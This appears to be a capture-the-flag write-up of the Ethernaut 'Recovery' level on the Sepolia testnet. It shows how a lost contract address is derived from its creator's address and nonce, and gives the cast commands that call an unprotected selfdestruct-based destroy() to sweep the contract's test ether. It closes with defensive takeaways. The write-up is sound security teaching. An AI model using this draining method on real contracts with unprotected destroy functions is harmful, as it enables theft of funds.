# 17 - Recovery

## Overview

- **Difficulty:** 4/10
- **Network:** Sepolia Testnet
- **Recovery Instance Address:** [`0x148f9b2169EAcf6FB8bFf33e3bbAcb4a22F68830`](https://sepolia.etherscan.io/address/0x148f9b2169EAcf6FB8bFf33e3bbAcb4a22F68830)
- **Lost SimpleToken Address:** [`0xCA25E5c999A132C1F0Af9e5c7104D01983abcD66`](https://sepolia.etherscan.io/address/0xCA25E5c999A132C1F0Af9e5c7104D01983abcD66)
- **Transactions:**
  - **1. Destroy SimpleToken (`destroy(address)`):** [`0x9577697c40b1b2307767fd89daa9c07fbee6a789b5aeb13ebd6800dcb8b037c0`](https://sepolia.etherscan.io/tx/0x9577697c40b1b2307767fd89daa9c07fbee6a789b5aeb13ebd6800dcb8b037c0)
  - **2. Level Submission:** [`0x8a90638c8e94ac89eb0bbbc659bc4731d10a62405da74f5e1b06114986f67667`](https://sepolia.etherscan.io/tx/0x8a90638c8e94ac89eb0bbbc659bc4731d10a62405da74f5e1b06114986f67667)

---

## Objective

A contract creator deployed a new token contract (`SimpleToken`) via the `Recovery` contract and sent `0.001 ETH` to it. However, the creator forgot the address where the contract was deployed and did not store the reference anywhere in storage!

Our goal is to **recover the lost 0.001 ETH** by finding the deployed `SimpleToken` address and draining/destroying it.

---

## Contract Analysis

The target contracts are in [`src/17-recovery/Recovery.sol`](./Recovery.sol):

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Recovery {
    //generate tokens
    function generateToken(string memory _name, uint256 _initialSupply) public {
        new SimpleToken(_name, msg.sender, _initialSupply);
    }
}

contract SimpleToken {
    string public name;
    mapping(address => uint256) public balances;

    // constructor
    constructor(string memory _name, address _creator, uint256 _initialSupply) {
        name = _name;
        balances[_creator] = _initialSupply;
    }

    // collect ether in return for tokens
    receive() external payable {
        balances[msg.sender] = msg.value * 10;
    }

    // allow transfers of tokens
    function transfer(address _to, uint256 _amount) public {
        require(balances[msg.sender] >= _amount);
        balances[msg.sender] = balances[msg.sender] - _amount;
        balances[_to] = _amount;
    }

    // clean up after ourselves
    function destroy(address payable _to) public {
        selfdestruct(_to);
    }
}
```

### Observations

1. **Missing State Pointer:** `Recovery.generateToken` creates a `new SimpleToken` using standard `CREATE`, but discards the returned address:
   ```solidity
   new SimpleToken(_name, msg.sender, _initialSupply);
   ```
2. **Unprotected `destroy()` Function:** `SimpleToken.destroy` invokes `selfdestruct(_to)`. Crucially, there are **no access controls or modifier checks** (e.g. no `onlyOwner` or `require(msg.sender == _creator)`). Anyone can call `destroy(_to)` and sweep all remaining ether to any target address!
3. **The Core Puzzle:** In order to call `destroy()`, we need the address of the deployed `SimpleToken` contract.

---

## Vulnerability & EVM Mechanics: Deterministic Address Derivation

Contract addresses in Ethereum are **not random**. When deploying a contract using the standard `CREATE` opcode (`new ContractName(...)`), the resulting address is computed deterministically from:

1. The **creator's address** (`sender`)
2. The creator's **transaction nonce** (`nonce`)

### The EVM Formula

$$\text{Address} = \text{keccak256}(\text{RLP}([sender, nonce]))[12:]$$

- **`sender`**: The address creating the contract (in our case, the `Recovery` contract address).
- **`nonce`**: The number of contracts created by this contract account.
- **`RLP`**: Recursive Length Prefix encoding.
- **`[12:]`**: Taking the rightmost 20 bytes (40 hex characters) of the 32-byte Keccak-256 hash.

### Contract Nonces in Ethereum (EIP-161)

Under [EIP-161 (Spurious Dragon)](https://eips.ethereum.org/EIPS/eip-161), when any contract account is created on Ethereum, its account nonce is initialized to **`1`** (whereas an EOA starts with nonce `0`).

When the Ethernaut level factory created the `Recovery` contract instance, the `Recovery` contract began with `nonce = 1`. During its initial setup transaction, `Recovery` immediately created its first child contract (`SimpleToken`).

Therefore:

- `sender` = `0x148f9b2169EAcf6FB8bFf33e3bbAcb4a22F68830`
- `nonce` = `1`

---

## Deriving the Lost Address

We can find the contract address through two methods:

### Method 1: Mathematical Calculation via RLP & Keccak-256

Let's compute the exact RLP serialization for `[address, 1]`:

1. **Address Encoding (20 bytes):**
   - For a string/bytes between 0 and 55 bytes, RLP prepends `0x80 + length`.
   - Length of an address is 20 (`0x14`).
   - Prefix: `0x80 + 0x14 = 0x94`.
   - Result: `0x94` followed by the 20-byte address `0x148f9b2169EAcf6FB8bFf33e3bbAcb4a22F68830`.
2. **Nonce Encoding (value = 1):**
   - For an integer in `[0x00, 0x7f]`, its RLP encoding is simply the single byte itself: `0x01`.
3. **List Encoding (2 items):**
   - Total payload length: $1\text{ byte (0x94)} + 20\text{ bytes (address)} + 1\text{ byte (nonce)} = 22\text{ bytes } (0x16)$.
   - For lists of length 0–55 bytes, RLP prepends `0xc0 + length`.
   - List prefix: `0xc0 + 0x16 = 0xd6`.
4. **Complete RLP-Encoded Byte Array:**
   ```text
   0xd694148f9b2169EAcf6FB8bFf33e3bbAcb4a22F6883001
   ```
5. **Keccak-256 Hash:**
   ```bash
   cast keccak 0xd694148f9b2169EAcf6FB8bFf33e3bbAcb4a22F6883001
   ```
   Output:
   ```text
   0xa5b582b7d23b2c54c50c3e83ca25e5c999a132c1f0af9e5c7104d01983abcd66
   ```
   Taking the last 20 bytes gives:
   ```text
   0xCA25E5c999A132C1F0Af9e5c7104D01983abcD66
   ```

Foundry provides a built-in helper command `cast compute-address` that does this calculation automatically:

```bash
cast compute-address 0x148f9b2169EAcf6FB8bFf33e3bbAcb4a22F68830 --nonce 1
# Output: 0xCA25E5c999A132C1F0Af9e5c7104D01983abcD66
```

---

### Method 2: Public Block Explorer (Etherscan)

Because the blockchain is a transparent public ledger:

1. Search the `Recovery` contract address [`0x148f9b2169EAcf6FB8bFf33e3bbAcb4a22F68830`](https://sepolia.etherscan.io/address/0x148f9b2169EAcf6FB8bFf33e3bbAcb4a22F68830) on Sepolia Etherscan.
2. Under the **Internal Txns** tab, observe the contract creation trace:
   - Contract `0xCA25E5c999A132C1F0Af9e5c7104D01983abcD66` was created by `0x148f9b2169EAcf6FB8bFf33e3bbAcb4a22F68830`.
   - A deposit of `0.001 ETH` was sent directly into `SimpleToken`.

---

## Step-by-Step Exploit Walkthrough

### 1. Verify Balance of Lost Contract

Check that `SimpleToken` indeed holds `0.001 ETH`:

```bash
cast balance 0xCA25E5c999A132C1F0Af9e5c7104D01983abcD66 --rpc-url sepolia
# Output: 1000000000000000 (0.001 ether)
```

### 2. Trigger `destroy()` to Recover Funds

Call `SimpleToken.destroy(address)` passing our player address `0xf511E1029dE5295f6D0dE05f4431DdA203e63607`:

```bash
cast send 0xCA25E5c999A132C1F0Af9e5c7104D01983abcD66 \
  "destroy(address)" 0xf511E1029dE5295f6D0dE05f4431DdA203e63607 \
  --rpc-url sepolia \
  --account <ACCOUNT_NAME>
```

- **Tx Hash:** [`0x9577697c40b1b2307767fd89daa9c07fbee6a789b5aeb13ebd6800dcb8b037c0`](https://sepolia.etherscan.io/tx/0x9577697c40b1b2307767fd89daa9c07fbee6a789b5aeb13ebd6800dcb8b037c0)

Verify the contract balance is drained to 0:

```bash
cast balance 0xCA25E5c999A132C1F0Af9e5c7104D01983abcD66 --rpc-url sepolia
# Output: 0
```

### 3. Submit Level

Submit the level on the Ethernaut dashboard:

- **Submission Tx:** [`0x8a90638c8e94ac89eb0bbbc659bc4731d10a62405da74f5e1b06114986f67667`](https://sepolia.etherscan.io/tx/0x8a90638c8e94ac89eb0bbbc659bc4731d10a62405da74f5e1b06114986f67667)

---

## Key Security Takeaways

1. **Contract Addresses Are Never "Hidden":**
   Even if a factory or deploying contract does not record the address of a newly deployed contract, the address is completely deterministic and publicly discoverable through EVM address calculation formulas or transaction traces.
2. **Access Control on Destructive Functions:**
   Self-destruct and fund withdrawal functions must always be protected with rigorous access controls (e.g. `onlyOwner`, multi-signature, or timelocks). Leaving `selfdestruct` open to arbitrary external callers is an immediate critical vulnerability.
3. **Evolution of `selfdestruct` (EIP-6780 / Cancun):**
   In modern Ethereum post-Cancun (EIP-6780), `selfdestruct` only destroys contract bytecode and clears storage if called within the **same transaction** as contract creation. In all other transactions, it simply transfers the entire ether balance to the recipient without destroying code or storage. In both paradigms, trapped funds are transferred.
4. **Deterministic Deployment (`CREATE` vs `CREATE2`):**
   - `CREATE`: Address is determined by `sender` and sequential `nonce`.
   - `CREATE2`: Address is determined by `sender`, `salt`, and `keccak256(init_code)`. This enables counterfactual address prediction regardless of deployment order or nonce.
